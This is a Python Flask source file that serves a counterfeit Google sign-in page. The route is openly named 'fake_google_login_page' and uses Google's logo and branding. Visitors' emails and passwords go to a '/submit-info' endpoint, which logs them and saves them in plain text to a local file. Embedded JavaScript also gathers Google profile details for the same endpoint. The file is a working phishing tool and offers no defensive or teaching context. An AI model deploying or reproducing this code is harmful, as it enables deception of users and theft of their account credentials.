import requests
import logging
logging.basicConfig(level=logging.INFO)
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/submit-info', methods=['POST'])
def submit_info():
    data = request.form
    logging.info('Info received: {}'.format(data))
    
    with open('form_data.txt', 'a') as file:
        file.write('{}: {}\n'.format(datetime.now(), data.to_dict()))
    
    return 'Received!'

@app.route('/')
def fake_google_login_page():
    return '''
    <style>
        body { font-family: Arial, sans-serif; }
        .google-logo { background: url(https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png) no-repeat; }
        .container { width: 100%; text-align: center; }
        .g-signin2 { margin-top: 15px; }
        .g-signin2 > div:first-of-type { border: 1px solid #4285f4; border-radius: 4px; width: 14.2em; height: 2.7em; }
        .g-signin2 > div:first-of-type span { background: none !important; }
        .g-signin2 > div:first-of-type > div { display: inline-block; position: relative; top: -0.15em; left: 0.275em; }
        .g-signin2 > div:first-of-type > div:first-of-type {clip-path: inset(100% 36% 0 0); top: -0.7em; left: -0.4em; width: 0; height: 0; margin: 0; padding: 0; border: none; position: relative;}
    </style>
    <div class="container">
        <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
        <h2> Sign in </h2>
        <form method="post" action="/submit-info">
            <input type="email" name="email" placeholder="Enter your email">
            <input type="password" name="password" placeholder="Enter your password">
            <button type="submit">Next</button>
            <span>Not your computer? Use Guest mode to sign in privately.</span>
            <input type="submit" value="Guest mode"">
        </form>
        <div class="g-signin2" data-onsuccess="onSignIn"></div>
    </div>
    <script src="https://apis.google.com/js/platform.js" async defer></script>
    <script>
        function onSignIn(googleUser) {
            var profile = googleUser.getBasicProfile();
            var data = {
                email: profile.getEmail(),
                name: profile.getName(),
                image: profile.getImageUrl()
            };
            fetch('/submit-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(function(response) {
                return response.text();
            }).then(function(text) {
                console.log('Response: ' + text);
            }).catch(function(error) {
                console.error('Error: ' + error);
            });
        }
    </script>
    '''

if __name__ == '__main__':
    app.logger.setLevel(logging.INFO)
    app.run(debug=False, host='0.0.0.0')
